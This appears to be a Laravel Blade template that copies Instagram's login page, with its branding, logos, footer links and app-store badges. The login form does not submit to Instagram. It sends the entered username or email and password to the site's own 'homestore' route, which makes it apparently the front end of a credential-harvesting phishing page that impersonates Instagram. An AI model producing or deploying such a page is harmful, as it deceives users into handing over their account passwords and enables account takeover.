<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link href="{{ asset('css/app.css') }}" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300&display=swap" rel="stylesheet">
    <link rel="shortcut icon" href="{{ asset('images/logo3.png') }}" type="image/x-icon">
    <title>Connexion - Instagram
    </title>
</head>
<style>
    .font {
        background-color: #fafafa;
    }

    .size {
        width: 23rem;
    }

    .inputcolor {
        background-color: #fffcfc;
    }

    .bluebutton {
        background-color: #b8dcfc;
    }

    .fonttext {
        font-family: 'Roboto', sans-serif;
    }

    @font-face {
        font-family: 'font';
        src: url('font/font.ttf') format('truetype');
    }

    @font-face {
        font-family: 'font2';
        src: url('font/font2.ttf') format('truetype');
    }

    .font2 {
        font-family: 'font2', Arial;
    }

    .fontpolice {
        font-family: 'font', Arial;
    }
</style>

<body class="font fontpolice">
    <div class="flex justify-center mt-10">
        <div class="bg-white border size border-gray-300">
            <div class="flex justify-center">
                <img class="mt-10" width="" height="" src="images/logo.png" alt="">
            </div>
            <div class="flex justify-center mt-8">
                <form method="POST" class="inline-block px-8" action="{{ route('homestore') }}">
                    @csrf
                    <input id="emailField"
                        class="border border-gray-300 inputcolor rounded px-2 py-3 block w-72 text-xs focus:outline-none focus:border-gray-400 focus:border"
                        type="text" placeholder="Phone number, username, or email" name="emailsite">
                    <input id="passwordField"
                        class="border border-gray-300 rounded inputcolor px-2 py-3 mt-2 block w-full text-xs focus:outline-none focus:border-gray-400 focus:border"
                        type="password" placeholder="Password" name="password">
                    <button id="submitButton" disabled
                        class="bg-blue-500 hover:bg-blue-700 opacity-60 w-full rounded mt-4 p-1 font-semibold font2 text-white ">Log
                        In</button>
                </form>
            </div>
            <div>
                <h1 class="mt-4 text-gray-400 text-center font text-sm font-bold">OR</h1>
            </div>
            <div class="flex justify-center mt-4">
                <a href="/https://www.facebook.com/login.php">
                    <img width="20" height="10" src="images/logo2.webp" alt=""></a>
                <a href="https://www.facebook.com/login.php">
                    <h1 class="text-blue-900 font-bold text-sm ml-2">Log in with Facebook</h1>
                </a>
            </div>
            <div>
                <a href="https://www.instagram.com/accounts/password/reset/">
                    <h1 class="text-xs text-center mt-4 mb-6">Forgot password ?</h1>
                </a>
            </div>
        </div>
    </div>
    <div class="flex justify-center mt-2">
        <div class="bg-white border size border-gray-300">
            <h1 class="text-sm font p-6 text-center">Don't have an account ? <a class="text-blue-500 font-bold text-md"
                    href="">Sign up</a></h1>
        </div>
    </div>
    <div>
        <h1 class="text-center mt-4 text-sm">Get the app.</h1>
    </div>
    <div class="mt-4 flex justify-center">
        <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo"><img class="mx-1" width="150"
                height="100" src="images/apple.png" alt=""></a>
        <a
            href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DB4168539-1BC5-48A6-82F2-EA030E18AC1C%26utm_content%3Dlo%26utm_medium%3Dbadge"><img
                class="mx-1" width="150" height="100" src="images/google.png" alt=""></a>
    </div>
    <div class="mt-14 text-xs text-gray-500">
        <div class="flex justify-center">
            <a class="mx-2" href="https://about.facebook.com/meta">Meta</a>
            <a class="mx-2" href="https://about.instagram.com/blog/">About</a>
            <a class="mx-2" href="https://about.instagram.com/about-us/careers">Blog</a>
            <a class="mx-2" href="https://about.instagram.com/about-us/careers">Jobs</a>
            <a class="mx-2" href="https://about.instagram.com/about-us/careers">Help</a>
            <a class="mx-2" href="https://developers.facebook.com/docs/instagram">API</a>
            <a class="mx-2" href="https://www.instagram.com/legal/privacy/">Privacy</a>
            <a class="mx-2" href="https://www.instagram.com/legal/terms/">Terms</a>
            <a class="mx-2" href="https://www.instagram.com/directory/profiles/">Top Accounts</a>
            <a class="mx-2" href="https://www.instagram.com/directory/hashtags/">Hashtags</a>
            <a class="mx-2" href="https://www.instagram.com/explore/locations/">Locations</a>
            <a class="mx-2" href="https://www.instagram.com/web/lite/">Instagram Lite</a>
            <a class="mx-2" href="https://www.facebook.com/help/instagram/261704639352628">Contact Uploading &
                Non-Users</a>
        </div>
        <div class="mt-4 flex justify-center mb-20">
            <h1 class="mx-2">English</h1>
            <h1 class="mx-2">© 2022 Instagram from Meta</h1>
        </div>
    </div>

    <script>
        let emailField = document.getElementById('emailField');
        let passwordField = document.getElementById('passwordField');
        let submitButton = document.getElementById('submitButton');

        function toggleButton() {
            submitButton.disabled ? submitButton.disabled = false : submitButton.disabled = true;
        }

        document.addEventListener('keyup', function() {
            if (emailField.value.length > 1 && passwordField.value.length > 5) {
                if (submitButton.classList.contains('opacity-60')) {
                    submitButton.classList.remove(
                        'opacity-60')
                    toggleButton()
                }
            } else {
                if (!submitButton.classList.contains('opacity-60')) {
                    submitButton.classList.add('opacity-60')
                    toggleButton()
                }
            }
        });
    </script>
</body>

</html>
